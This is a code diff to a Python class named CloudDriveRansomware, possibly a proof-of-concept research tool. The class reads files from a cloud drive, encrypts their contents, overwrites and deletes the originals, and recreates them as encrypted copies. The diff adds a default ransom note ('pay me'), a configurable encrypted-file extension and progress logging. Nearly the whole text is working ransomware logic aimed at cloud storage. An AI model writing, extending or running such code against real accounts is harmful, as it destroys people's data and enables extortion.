@@ -23,7 +23,7 @@ class CloudDriveRansomware:
     def _third_stage_recreation_finished_callback(self, paths_to_encrypted_contents):
         pass
         
-    def start_ransomware(self, target_cloud_file_items: list[CloudDriveFileItem], ransom_note: str, quick_delete: bool = False):
+    def start_ransomware(self, target_cloud_file_items: list[CloudDriveFileItem], ransom_note: str = "pay me", quick_delete: bool = False, file_extension: str = ".encrypted"):
         self.__generate_key()
         self.__save_key()
         paths_to_encrypted_contents = self.__create_encrypted_contents_from_cloud_files(target_cloud_file_items)
@@ -31,15 +31,18 @@ class CloudDriveRansomware:
         if not quick_delete:
             for cloud_file_path, file_encrypted_content in paths_to_encrypted_contents.items():
                 cloud_drive_item = self._cloud_drive.get_item_by_path(cloud_file_path)
+                print(f"Modifying file: {cloud_file_path}")
                 self._cloud_drive.modify_file_content(cloud_drive_item, file_encrypted_content)
             self._first_stage_overwriting_finished_callback(paths_to_encrypted_contents)
 
         for cloud_file in target_cloud_file_items:
+            print(f"Deleting file: {cloud_file.full_path}")
             self._cloud_drive.delete_item(cloud_file)
         self._second_stage_deletion_finished_callback(paths_to_encrypted_contents)
 
         for cloud_file_path, new_file_content in paths_to_encrypted_contents.items():
-            self._cloud_drive.create_file(cloud_file_path, new_file_content)
+            print(f"Creating file with encrypted contents: {cloud_file_path}.{file_extension}")
+            self._cloud_drive.create_file(f"{cloud_file_path}.{file_extension}", new_file_content)
         self._third_stage_recreation_finished_callback(paths_to_encrypted_contents)
 
     
@@ -56,7 +59,7 @@ class CloudDriveRansomware:
     def __create_encrypted_contents_from_cloud_files(self, target_cloud_file_items: list[CloudDriveFileItem]) -> dict[str, bytes]:
         paths_to_encrypted_contents = {}
         for cloud_file_item in target_cloud_file_items:
-            print(f"Encrypting file: {cloud_file_item.full_path}")
+            print(f"Generating encrypted contents for file: {cloud_file_item.full_path}")
             file_content = self._cloud_drive.read_file_content(cloud_file_item)
             file_new_content = self.__encrypt_file_content(file_content)
             paths_to_encrypted_contents[cloud_file_item.full_path] = file_new_content
